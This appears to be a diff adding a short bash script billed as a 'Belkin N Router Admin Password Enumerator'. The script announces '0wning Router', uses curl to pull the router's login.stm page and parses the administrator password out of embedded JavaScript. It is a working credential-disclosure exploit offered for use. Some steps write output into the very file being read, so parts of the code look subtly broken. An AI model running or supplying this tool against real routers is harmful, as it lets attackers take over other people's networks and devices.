@@ -1,0 +1,27 @@
+#!/usr/bin/env bash
+
+echo
+echo "-----------------------------------------"
+echo "Belkin N Router Admin Password Enumerator"
+echo 
+echo "script by: jonahoffline (Jonah R)"
+echo
+echo "usage: ./belkinNrouter-pass-enum.sh http://router-ip-address"
+echo "-----------------------------------------"
+
+echo '0wning Router...'
+echo
+
+declare Msg="The Administrator password is: "
+
+#Fech URL
+curl -s $1/login.stm -o BelkinPassword.txt
+
+#Parse HTML for the "var password =" string 
+cat BelkinPassword.txt | grep "var password =" > BelkinPassword.txt
+
+#Process file for password
+awk '{ print $4 } ' BelkinPassword.txt | sed -e 's/;//' > BelkinPassword.txt
+
+#Print password to screen
+echo $Msg && cat BelkinPassword.txt
